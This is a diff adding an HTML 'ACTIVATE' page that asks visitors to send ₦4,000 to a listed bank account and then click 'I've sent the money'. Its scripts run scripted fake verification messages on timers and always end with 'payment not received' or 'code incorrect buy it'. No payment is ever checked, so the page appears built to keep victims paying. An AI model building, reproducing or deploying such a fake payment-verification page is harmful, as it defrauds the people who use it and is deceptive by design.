@@ -1,0 +1,143 @@
+<html lang="en"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_45QCzI"></div><head><script>
+    <!-- code by https://www.html-code-generator.com -->
+    </script>
+    
+    
+    
+    
+    
+    
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale: 1.0">
+        <style>
+            body {
+                background-color: rgba(0, 0, 255, 0.075) ;
+                display: flex;
+                align-items: center;
+                width: 280px;
+                margin: 0;
+                color: green;
+            }
+            .container {
+                text-align: center;
+            }
+            h1 {
+                font-size: 26px;
+                margin-top: 0;
+            }
+            h2 {
+                font-size: 14px;
+            }
+            p {
+                font-size: 10px;
+            }
+            input[type="text"], input[type="email"] {
+                width: 400px;
+                padding: 15px;
+                font-size: 10px;
+            }
+            button {
+                background-color:  blue;
+                color: #fff;
+                border: none;
+                padding: 15px 30px;
+                font-size: 24px;
+                cursor: pointer;
+                margin-top: 20px;
+            }
+            button:disabled {
+                background-color: #555;
+                cursor: not-allowed;
+            }
+            .loading-message {
+                display: none;
+            }
+            .popup p{
+                font-size: 10px;
+            }
+            .popup{
+                display: none;
+            }
+            .container h2{
+                font-size: 35px;
+            }
+            .container p{
+                font-size: 20px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>ACTIVATE</h1>
+            <p>To activate the features, make a one-time payment fee of <span style="color: green;">₦4,000</span> and click on <span style="color: green;">I have sent the money</span>.</p>
+            <h2>Payment Method</h2>
+            <p>Bank: PalmPay Limited</p>
+            <p>Account No: 7080377742</p>
+            <p>Account name: Pay/Authorization Bot<p>
+            <p>After making your payment put your email below and tap on i've have sent the money.</p>
+            <input type="email" placeholder="Email" required="">
+            <button id="sentMoneyButton">I've sent the money</button>
+            <div class="loading-message" id="loadingMessage">
+                <!-- Initially empty -->
+            </div>
+        </div>
+        <script>
+            const sentMoneyButton = document.getElementById("sentMoneyButton");
+    
+            sentMoneyButton.addEventListener("click", function () {
+                sentMoneyButton.disabled = true;
+                const loadingMessage = document.getElementById("loadingMessage");
+                loadingMessage.style.display = "block";
+                loadingMessage.innerText = "Payment Verifying...";
+    
+                // Simulate a 5-second loading delay for the "I've sent the money" button
+                setTimeout(function () {
+                    loadingMessage.style.display = "none";
+                    loadingMessage.innerText = "Processing...";
+                    loadingMessage.style.display = "block";
+                    setTimeout(function () {
+                        loadingMessage.innerText = "Initializing account...";
+                        setTimeout(function () {
+                            loadingMessage.innerText = "Confirming Payment...";
+                            setTimeout(function () {
+                                loadingMessage.innerText = "payment not received Please make payment";
+                                sentMoneyButton.disabled = false;
+                            }, 2000); // Simulated 2-second delay for "Verification Code Incorrect"
+                        }, 2000); // Simulated 2-second delay for "Confirming Payment"
+                    }, 2000); // Simulated 2-second loading delay for "Initializing Card"
+                }, 5000); // Simulated 5-second loading delay for the "I've sent the money" button
+            });
+        </script>
+         <script>
+            const activateButton = document.getElementById("activateButton");
+    
+            activateButton.addEventListener("click", function () {
+                activateButton.disabled = true;
+                const popup = document.getElementById("popup");
+                popup.style.display = "block";
+                popup.innerText = "Payment Verifying...";
+    
+                // Simulate a 5-second loading delay for the "I've sent the money" button
+                setTimeout(function () {
+                    popup.style.display = "none";
+                    popup.innerText = "validating code...";
+                    popup.style.display = "block";
+                    setTimeout(function () {
+                        popup.innerText = "processing code...";
+                        setTimeout(function () {
+                            popup.innerText = "initializing code...";
+                            setTimeout(function () {
+                                popup.innerText = "code incorrect buy it";
+                                activateButton.disabled = false;
+                            }, 2000); // Simulated 2-second delay for "Verification Code Incorrect"
+                        }, 2000); // Simulated 2-second delay for "Confirming Payment"
+                    }, 2000); // Simulated 2-second loading delay for "Initializing Card"
+                }, 5000); // Simulated 5-second loading delay for the "I've sent the money" button
+            });
+        </script>
+    
+    
+        
+    
+    
+    </body></html>
